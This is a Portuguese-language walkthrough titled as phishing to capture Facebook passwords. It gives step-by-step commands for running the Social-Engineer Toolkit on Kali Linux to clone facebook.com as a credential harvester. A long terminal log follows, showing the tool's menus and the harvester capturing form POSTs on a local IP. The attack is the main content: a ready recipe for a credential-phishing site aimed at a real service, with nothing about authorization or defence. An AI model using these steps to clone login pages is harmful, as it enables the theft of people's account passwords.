# Phishing para captura de senhas do Facebook

### Ferramentas

- Kali Linux
- setoolkit

### Configurando o Phishing no Kali Linux

- Acesso root: ``` sudo su ```
- Iniciando o setoolkit: ``` setoolkit ```
- Tipo de ataque: ``` Social-Engineering Attacks ```
- Vetor de ataque: ``` Web Site Attack Vectors ```
- Método de ataque: ```Credential Harvester Attack Method ```
- Método de ataque: ``` Site Cloner ```
- Obtendo o endereço da máquina: ``` ifconfig ```
- URL para clone: http://www.facebook.com

### Resutados

![Alt text](./passwd.png "Optional title")




#################-------------------------------------------------------------------------------#############################

                         .  ..
                       MMMMMNMNMMMM=
                   .DMM.           .MM$
                 .MM.                 MM,.
                 MN.                    MM.
               .M.                       MM
              .M   .....................  NM
              MM   .8888888888888888888.   M7
             .M    88888888888888888888.   ,M
             MM       ..888.MMMMM    .     .M.
             MM         888.MMMMMMMMMMM     M
             MM         888.MMMMMMMMMMM.    M
             MM         888.      NMMMM.   .M
              M.        888.MMMMMMMMMMM.   ZM
              NM.       888.MMMMMMMMMMM    M:
              .M+      .....              MM.
               .MM.                     .MD
                 MM .                  .MM
                  $MM                .MM.
                    ,MM?          .MMM
                       ,MMMMMMMMMMM
                https://www.trustedsec.com

[---]        The Social-Engineer Toolkit (SET)         [---]
[---]        Created by: David Kennedy (ReL1K)         [---]
                      Version: 8.0.3
                    Codename: 'Maverick'
[---]        Follow us on Twitter: @TrustedSec         [---]
[---]        Follow me on Twitter: @HackingDave        [---]
[---]       Homepage: https://www.trustedsec.com       [---]
        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.

   The Social-Engineer Toolkit is a product of TrustedSec.
                                                                                                 
           Visit: https://www.trustedsec.com                                                     
                                                                                                 
   It's easy to update using the PenTesters Framework! (PTF)
Visit https://github.com/trustedsec/ptf to update all your tools!                                
                                                                                                 
                                                                                                 
 Unable to check for new version of SET (is your network up?)
                                                                                                 
 Select from the menu:

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   5) Mass Mailer Attack
   6) Arduino-Based Attack Vector
   7) Wireless Access Point Attack Vector
   8) QRCode Generator Attack Vector
   9) Powershell Attack Vectors
  10) Third Party Modules

  99) Return back to the main menu.

set> 2

The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.

The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.

The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.

The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.

The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.

The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.

The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.

The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser.

   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method

  99) Return to Main Menu

set:webattack>3

 The first method will allow SET to import a list of pre-defined web
 applications that it can utilize within the attack.

 The second method will completely clone a website of your choosing
 and allow you to utilize the attack vectors within the completely
 same web application you were attempting to clone.

 The third method allows you to import your own website, note that you
 should only have an index.html when using the import website
 functionality.
   
   1) Web Templates
   2) Site Cloner
   3) Custom Import

  99) Return to Webattack Menu

set:webattack>2
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

-------------------------------------------------------------------------------
--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---

The way that this works is by cloning a site and looking for form fields to
rewrite. If the POST fields are not usual methods for posting forms this 
could fail. If it does, you can always save the HTML, rewrite the forms to
be standard forms and use the "IMPORT" feature. Additionally, really 
important:

If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
IP address below, not your NAT address. Additionally, if you don't know
basic networking concepts, and you have a private IP address, you will
need to do port forwarding to your NAT IP address from your external IP
address. A browser doesns't know how to communicate with a private IP
address, so if you don't specify an external IP address if you are using
this from an external perpective, it will not work. This isn't a SET issue
this is how networking works.

set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.10]:192.168.1.10
[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone:http://www.facebook.com

[*] Cloning the website: https://login.facebook.com/login.php                                    
[*] This could take a little bit...                                                              


The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.                                                          
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80                                                   
[*] Information will be displayed to you as it arrives below:                                    
192.168.1.10 - - [10/Jun/2024 15:40:47] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------317399486214978329813885451          
Content-Disposition: form-data; name="ts"                                                        
                                                                                                 
1718044851611                                                                                    
-----------------------------317399486214978329813885451                                         
Content-Disposition: form-data; name="q"                                                         
                                                                                                 
[{"app_id":"256281040558","posts":"zQvIW1siZmFsY286cWUyX2pzX2V4cG9zdXJlIix7ImUiOiJ7XCJ1bml2ZXJzZVwiOlwiZmJ0ASdUcGVyZm9ybWFuY2VfdGVzdGluZ1wiLAUsDHRfaWQFKxkR9BgBdHlwZVwiOjl9IiwiciI6MSwiZCI6IiRefEFjYU1ZMjNTaHpyUkZfbDNLUVVidFJEQnhhTF9xN2pxRUxES2FZSUhQMmdkUFdlOGRKYTRXMWNiMjZWYWZQVWEtWld5UW1XeVhqODgwV2tPeXNRQnxmZC5BY1k2WTdCeG1QTDRKeDdHSm9EU1pDalN4MjF2V2xqZUFCMGJkS1JhYWlWRXQtcEJZUnZjckhEWVpUUzBlblpjRjA5R3hkRHZNNHhWTHhvVzdyalhKdkViIiwicyI6IjlkeGhrNzpscTFvbjc6cGlsZWVqIiwidCI6MTcxODA0NDc5Mjk5NywiYiI6WzEsMF19LDE3MTgwNDQ4NTA1NjUsMCwzMzNdLFstfHR3ZWJfYmx1ZV90aW1lX3NwZW50X25hdmlnYXRpb249iyBqc29uX2RhdGElYTx7XFxcInNvdXJjZV9wYXRoAQ8UOm51bGwsAQoNGRB0b2tlbgEQGRoMZGVzdBkxARxIWFdlYkxvZ2luQ29udHJvbGxlcgEXBUgFLhlGARgcOTZlODhhZjMBDAUkJGltcHJlc3Npb24h/QhcXCIFJ0AxNkZmSFhmbGdTQnBQRlcwawEaBTAQY2F1c2UBDgUoDGxvYWQBDQUbGHNpZF9yYXcBEAUdADlKbAEBHQAsAQUUcmVmZXJyCa0FLgEVBRoAZAHkFGVmX3BhZwlpNRgFGgh1cmkBKwU0ZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sIRIMLnBocAErCH1cIv6/Av6/Av6/Aqq/AhQzODA3LCJSvwIkNzIsMCw2NDFdLJE7Qb+BETxfZGV2aWNlX2luZm9fbG9nXbkkY3B1X2NvcmVzXGH/FFwicmFtXFGSJCJncHVfcmVuZGUhyiQiOlwibGx2bXBpgTQALAkeFHZlbmRvcgUcJE1lc2EvWC5vcmf+kQH+kQH+kQGykQEMNDE1NFaRASg5MTksMCwzNDVdXQ==","user":"0","webSessionId":"9dxhk7:lq1on7:pileej","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":36}]                                    
-----------------------------317399486214978329813885451--                                       
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:40:51] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw&__hs=19884.BP%3ADEFAULT.2.0..0.0&__hsi=7378946191122667060&__req=1&__rev=1014092037&__s=9dxhk7%3Alq1on7%3Apileej&__spin_b=trunk&__spin_r=1014092037&__spin_t=1718044791&__user=0&dpr=2&jazoest=21042&lsd=AVo0ipaaaiw HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------41774201420375985844260511288        
Content-Disposition: form-data; name="ts"                                                        
                                                                                                 
1718044859615                                                                                    
-----------------------------41774201420375985844260511288                                       
Content-Disposition: form-data; name="q"                                                         
                                                                                                 
[{"app_id":"256281040558","posts":"jAyAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF5hiaXRzLmpzX2luaXRpYWxpemVkXCI6WzEsbnVsbF19fSxcIjcxNzMJODBlbnRpdGllcy5mZl9qBYoMLnFlMgELZGV4cG9zdXJlLjI1NjI4MTA0MDU1OC4wLkMzDToAdgGEDGxvZ2cyYAAILFwiCRoUY2FwdHVyVhwAKGluZm8uYmFuemFpAUJELnVwbG9hZF9wcm9jZXNzaW5nHbEVUQklMlEAAH0BHUbCACVQDGx1ZV85FihfbmF2aWdhdGlvbt7RAAW1CYUYX21ldGhvZB3DLF9pbW1lZGlhdGVseU69AAU9GfIuLwARVML+AAH9JYVKawFqGgEscGVyZl9kZXZpY2VfAZcMX2xvZ/IUARnX/ssAVssA9AwBfX19IiwiciI6MSwiZCI6IiRefEFjYU1ZMjNTaHpyUkZfbDNLUVVidFJEQnhhTF9xN2pxRUxES2FZSUhQMmdkUFdlOGRKYTRXMWNiMjZWYWZQVWEtWld5UW1XeVhqODgwV2tPeXNRQnxmZC5BY1k2WTdCeG1QTDRKeDdHSm9EU1pDalN4MjF2V2xqZUFCMGJkS1JhYWlWRXQtcEJZUnZjckhEWVpUUzBlblpjRjA5R3hkRHZNNHhWTHhvVzdyalhKdkViIiwicyI6IjlkeGhrNzpscTFvbjc6cGlsZWVqIiwidCI6MTcxODA0NDc5Nzk5OSwiYiI6WzEsMF19LDE3MTgwNDQ4NTQ3NjQsMCxhiQRdLJE+Qepd5SBiaXRfYXJyYXmdSShzaWRfcmF3XCI6XFKAACRcIixcInN0YXJ0BUoIXCI6FXMYMCxcInRvcwlTAFyBRAw5MywwQXgBFhhjdW1cIjozDSQIaWRcAWIAcAXUAFwBVAEkGGxlblwiOjkNJBhzZXFcIjow/s4B/s4B/s4Bos4BFDgwMTgzMFLOASw4NTk1LDAsNDA1XV0=","user":"0","webSessionId":"9dxhk7:lq1on7:pileej","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":"snappy_base64","snappy_ms":15}]                 
-----------------------------41774201420375985844260511288--                                     
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:40:59] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw&__hs=19884.BP%3ADEFAULT.2.0..0.0&__hsi=7378946191122667060&__req=2&__rev=1014092037&__s=9dxhk7%3Alq1on7%3Apileej&__spin_b=trunk&__spin_r=1014092037&__spin_t=1718044791&__user=0&dpr=2&jazoest=21042&lsd=AVo0ipaaaiw HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=3                                                                                 
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=3                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=9dxhk7:lq1on7:pileej                                                                  
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:41:20] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=3                                                                                 
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=4                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=9dxhk7:lq1on7:pileej                                                                  
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:41:20] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=3                                                                                 
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=5                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=9dxhk7:lq1on7:pileej                                                                  
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:41:21] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------2154744655234809413672005973         
Content-Disposition: form-data; name="ts"                                                        
                                                                                                 
1718044927540                                                                                    
-----------------------------2154744655234809413672005973                                        
Content-Disposition: form-data; name="q"                                                         
                                                                                                 
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":[1,null],\"event.info.upload_method.banzai.log_immediately\":[1,null],\"event.info.banzai.log_immediately.upload_processing\":[1,null],\"event.uploaded\":[1,null],\"event.captured\":[1,null]}}}}","r":1,"d":"$^|AcaMY23ShzrRF_l3KQUbtRDBxaL_q7jqELDKaYIHP2gdPWe8dJa4W1cb26VafPUa-ZWyQmWyXj880WkOysQB|fd.AcY6Y7BxmPL4Jx7GJoDSZCjSx21vWljeAB0bdKRaaiVEt-pBYRvcrHDYZTS0enZcF09GxdDvM4xVLxoW7rjXJvEb","s":"9dxhk7:lq1on7:pileej","t":1718044807583,"b":[1,0]},1718044864348,0,555]],"user":"0","webSessionId":"9dxhk7:lq1on7:pileej","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""},{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"9dxhk7:lq1on7:pileej\",\"start_time\":1718044861,\"tos_array\":[3,0],\"tos_cum\":5,\"tos_id\":\"pileej\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|AcaMY23ShzrRF_l3KQUbtRDBxaL_q7jqELDKaYIHP2gdPWe8dJa4W1cb26VafPUa-ZWyQmWyXj880WkOysQB|fd.AcY6Y7BxmPL4Jx7GJoDSZCjSx21vWljeAB0bdKRaaiVEt-pBYRvcrHDYZTS0enZcF09GxdDvM4xVLxoW7rjXJvEb","s":":lq1on7:pileej","t":1718044868749,"b":[1,0]},1718044925520,0,398]],"user":"0","webSessionId":":lq1on7:pileej","compression":""}]                                         
-----------------------------2154744655234809413672005973--                                      
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:42:07] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw&__hs=19884.BP%3ADEFAULT.2.0..0.0&__hsi=7378946191122667060&__req=6&__rev=1014092037&__s=%3Alq1on7%3Apileej&__spin_b=trunk&__spin_r=1014092037&__spin_t=1718044791&__user=0&dpr=2&jazoest=21042&lsd=AVo0ipaaaiw HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=2                                                                                 
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=7                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=:lq1on7:pileej                                                                        
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:42:11] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=2                                                                                 
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=8                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=:lq1on7:pileej                                                                        
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:42:11] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=2                                                                                 
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=9                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=:lq1on7:pileej                                                                        
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:42:12] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------394893632217654923113415724201       
Content-Disposition: form-data; name="ts"                                                        
                                                                                                 
1718045078541                                                                                    
-----------------------------394893632217654923113415724201                                      
Content-Disposition: form-data; name="q"                                                         
                                                                                                 
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_web.web_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":[1,null],\"event.info.upload_method.banzai.log_immediately\":[1,null],\"event.info.banzai.log_immediately.upload_processing\":[1,null],\"event.uploaded\":[1,null],\"event.captured\":[1,null]}}}}","r":1,"d":"$^|AcaMY23ShzrRF_l3KQUbtRDBxaL_q7jqELDKaYIHP2gdPWe8dJa4W1cb26VafPUa-ZWyQmWyXj880WkOysQB|fd.AcY6Y7BxmPL4Jx7GJoDSZCjSx21vWljeAB0bdKRaaiVEt-pBYRvcrHDYZTS0enZcF09GxdDvM4xVLxoW7rjXJvEb","s":":lq1on7:pileej","t":1718044873756,"b":[1,0]},1718044930520,0,549]],"user":"0","webSessionId":":lq1on7:pileej","trigger":"falco:ods_web_batch","send_method":"ajax","compression":""}]                                
-----------------------------394893632217654923113415724201--                                    
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:44:38] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw&__hs=19884.BP%3ADEFAULT.2.0..0.0&__hsi=7378946191122667060&__req=a&__rev=1014092037&__s=%3Alq1on7%3Apileej&__spin_b=trunk&__spin_r=1014092037&__spin_t=1718044791&__user=0&dpr=2&jazoest=21042&lsd=AVo0ipaaaiw HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
PARAM: local_storage[Session]=20                                                                 
PARAM: local_storage[signal_flush_timestamp]=13                                                  
PARAM: local_storage[mutex_falco_queue_immediately\u005E$\u005E$]=20                             
PARAM: local_storage[mutex_falco_queue_log\u005E$\u005E$]=20                                     
PARAM: session_storage[TabId]=6                                                                  
PARAM: session_storage[sp_pi]=216                                                                
PARAM: logtime=11                                                                                
PARAM: __aaid=0                                                                                  
POSSIBLE USERNAME FIELD FOUND: __user=0                                                          
PARAM: __a=1                                                                                     
PARAM: __req=b                                                                                   
PARAM: __hs=19884.BP:DEFAULT.2.0..0.0                                                            
PARAM: dpr=2                                                                                     
PARAM: __ccg=EXCELLENT                                                                           
PARAM: __rev=1014092037                                                                          
PARAM: __s=:lq1on7:pileej                                                                        
PARAM: __hsi=7378946191122667060                                                                 
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zE6u7E3rw5ux60Vo1upE4W0OE2WxO0FE2awt81s8hwnU1oU884y0lW0ny0RE2Jw8Xwn83fw5rwSyE1582ZwrU1Xo1UU3jw                                                            
PARAM: __csr=                                                                                    
PARAM: lsd=AVo0ipaaaiw                                                                           
PARAM: jazoest=21042                                                                             
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1014092037                                               
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                                    
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1718044791                                               
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                                    
                                                                                                 
                                                                                                 
192.168.1.10 - - [10/Jun/2024 15:46:21] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                                            
PARAM: local_storage[mutex_falco_queue_critical\u005E$\u005E$]=20                                
